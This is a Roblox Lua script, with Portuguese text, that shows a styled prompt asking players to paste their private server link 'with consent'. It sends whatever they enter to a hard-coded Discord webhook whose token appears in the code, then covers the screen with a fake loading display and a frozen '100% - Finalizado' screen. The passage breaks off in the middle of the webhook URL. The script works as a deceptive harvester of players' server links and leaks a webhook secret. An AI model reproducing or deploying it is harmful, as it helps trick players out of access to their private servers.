-- Serviços
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- GUI principal
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PrivateServerConsent"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

-- Janela de entrada
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.5, 0, 0.4, 0)
frame.Position = UDim2.new(0.25, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.ClipsDescendants = true
frame.Active = true

-- Estilo visual
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0.05, 0)

local shadow = Instance.new("ImageLabel", frame)
shadow.Size = UDim2.new(1, 30, 1, 30)
shadow.Position = UDim2.new(0, -15, 0, -15)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://1316045217"
shadow.ImageTransparency = 0.5
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(10, 10, 118, 118)
shadow.ZIndex = 0

-- Título
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0.2, 0)
title.Position = UDim2.new(0, 10, 0.05, 0)
title.Text = "🚀 Envie seu link do servidor privado com consentimento"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextScaled = true
title.Font = Enum.Font.GothamBold

-- Caixa de texto
local textbox = Instance.new("TextBox", frame)
textbox.Size = UDim2.new(0.9, 0, 0.25, 0)
textbox.Position = UDim2.new(0.05, 0, 0.3, 0)
textbox.PlaceholderText = "Cole o link do servidor privado aqui"
textbox.Text = ""
textbox.TextScaled = true
textbox.Font = Enum.Font.Gotham
textbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", textbox)

-- Botão
local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.9, 0, 0.2, 0)
button.Position = UDim2.new(0.05, 0, 0.65, 0)
button.Text = "📤 Enviar link do servidor privado"
button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.Font = Enum.Font.GothamBold
Instance.new("UICorner", button)

-- Tela de carregamento
local loading = Instance.new("TextLabel", gui)
loading.Size = UDim2.new(1, 0, 1, 0)
loading.Position = UDim2.new(0, 0, 0, 0)
loading.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
loading.TextColor3 = Color3.fromRGB(255, 255, 255)
loading.TextScaled = true
loading.Font = Enum.Font.GothamBlack
loading.Visible = false
loading.Text = ""

-- Tela congelada final
local freeze = Instance.new("Frame", gui)
freeze.Size = UDim2.new(1, 0, 1, 0)
freeze.Position = UDim2.new(0, 0, 0, 0)
freeze.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
freeze.Visible = false

local freezeLabel = Instance.new("TextLabel", freeze)
freezeLabel.Size = UDim2.new(1, 0, 1, 0)
freezeLabel.Position = UDim2.new(0, 0, 0, 0)
freezeLabel.Text = "✅ 100% - Finalizado"
freezeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
freezeLabel.TextScaled = true
freezeLabel.Font = Enum.Font.GothamBlack
freezeLabel.BackgroundTransparency = 1

-- Botão de envio
button.MouseButton1Click:Connect(function()
    local link = textbox.Text
    if link ~= "" then
        frame.Visible = false
        loading.Visible = true

        -- Enviar ao webhook
        pcall(function()
            HttpService:PostAsync(
                "https://discord.com/api/webhooks/1422085613611389019/XRhr1u5VQsG2BEABfyxhHY58wSUvsXwhEwV7WIKzEVogMypL
